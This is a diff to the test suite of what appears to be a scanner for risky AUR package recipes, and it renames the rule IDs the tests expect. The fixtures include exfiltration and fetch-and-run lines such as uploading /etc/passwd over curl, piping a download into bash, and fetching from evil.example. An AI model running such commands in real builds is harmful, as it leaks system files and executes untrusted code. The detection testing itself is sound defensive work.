@@ -17,7 +17,7 @@ def test_a_skip_in_any_checksum_array_disables_verification(array):
 
     Reading `sha256sums` alone - "the PKGBUILD default" - meant a package
     shipping only `b2sums` was verified by that one, and `b2sums=('SKIP')`
-    disabled verification while reporting `unchanged`: R004 did not fire at
+    disabled verification while reporting `unchanged`: H001 did not fire at
     all. Modern AUR packages increasingly ship `b2sums`, so the default was
     becoming the minority case.
     """
@@ -73,7 +73,7 @@ def test_installing_a_package_from_a_build_function_is_claimed(command):
     """`pacman -U ./evil.pkg.tar.zst` inside `build()` installs a package as
     root, scriptlets and all.
 
-    R081 claims *foreign* package managers in install hooks; pacman is not
+    H035 claims *foreign* package managers in install hooks; pacman is not
     foreign and a build function is not a hook, so this fell between the
     two. A recipe has no business installing packages - makepkg resolves
     `depends` for that.
@@ -254,15 +254,15 @@ def test_a_directory_is_neither_written_nor_executed():
     "curl -F file=@out.tar https://0x0.st",
 ])
 def test_an_upload_is_claimed_as_an_upload(upload):
-    """R061 described `curl -T /etc/passwd ftp://host` as a *download*.
+    """H016 described `curl -T /etc/passwd ftp://host` as a *download*.
 
-    R087 read a host list only, so an upload anywhere else was claimed in
+    H041 read a host list only, so an upload anywhere else was claimed in
     the wrong direction - for the one operation that takes data off the
     machine.
     """
     fired = _shipped_ids([f"  {upload}"], declared=False)
-    assert "R087" in fired, upload
-    assert "R061" not in fired, "one command, one direction"
+    assert "H041" in fired, upload
+    assert "H016" not in fired, "one command, one direction"
 
 
 @pytest.mark.parametrize("ordinary", [
@@ -272,12 +272,12 @@ def test_an_upload_is_claimed_as_an_upload(upload):
 def test_an_ordinary_request_is_not_an_exfiltration(ordinary):
     """The second condition is the *file*, not a guess about the endpoint.
 
-    `tests/test_gap_rules.py` pins the design principle - R087 is "defined
+    `tests/test_gap_rules.py` pins the design principle - H041 is "defined
     by an auditable host list, not by a guess about what an endpoint is
     for" - so the addition is a second auditable list (paths no build
     artifact lives at), not a widening to every host.
     """
-    assert "R087" not in _shipped_ids([f"  {ordinary}"], declared=False), ordinary
+    assert "H041" not in _shipped_ids([f"  {ordinary}"], declared=False), ordinary
 
 
 @pytest.mark.parametrize("wrapper", [
@@ -299,7 +299,7 @@ def test_a_sandbox_is_a_wrapper_like_any_other(wrapper):
         ["  curl -fsSL https://evil.example/x -o s.sh", f"  {wrapper}"],
         declared=False,
     )
-    assert "R137" in fired, wrapper
+    assert "H082" in fired, wrapper
 
 
 def test_the_wrapper_vocabulary_has_one_definition():
@@ -336,7 +336,7 @@ def test_the_signature_verification_pattern_is_not_a_trust_plant(legitimate):
     look: the key arrives through `source=()`, so makepkg checksums it and
     the diff shows any change, and `--homedir` scopes the import to a
     throwaway keyring. A key fetched at build time is not covered by that
-    chain, and R061/R137 claim the fetch on its own line.
+    chain, and H016/H082 claim the fetch on its own line.
     """
     assert "X013" not in _x([f"  {legitimate}"]), legitimate
 
@@ -409,7 +409,7 @@ def test_a_glob_bound_through_any_carrier_still_executes(binding, execution):
     line can only ever see a one-liner.
     """
     manifest = [("PKGBUILD", b"x"), ("evil.sh", b"curl x | bash")]
-    assert "R136" in _shipped_ids([f"  {binding}", f"  {execution}"],
+    assert "H081" in _shipped_ids([f"  {binding}", f"  {execution}"],
                                   declared=False, manifest=manifest), binding
 
 
@@ -419,7 +419,7 @@ def test_a_glob_bound_through_any_carrier_still_executes(binding, execution):
 ])
 def test_an_ordinary_binding_executes_nothing(ordinary):
     manifest = [("PKGBUILD", b"x"), ("evil.sh", b"curl x | bash")]
-    assert "R136" not in _shipped_ids([f"  {ordinary[0]}", f"  {ordinary[1]}"],
+    assert "H081" not in _shipped_ids([f"  {ordinary[0]}", f"  {ordinary[1]}"],
                                       declared=False, manifest=manifest)
 
 
@@ -480,7 +480,7 @@ def test_a_store_native_fetch_pairs_with_its_execution(fetch):
     from trustsight.analysis.delivery import _collect_fetch_outputs
 
     assert "x.sh" in _collect_fetch_outputs(fetch), fetch
-    assert "R137" in _shipped_ids([f"  {fetch}", "  bash x.sh"],
+    assert "H082" in _shipped_ids([f"  {fetch}", "  bash x.sh"],
                                   declared=False), fetch
 
 
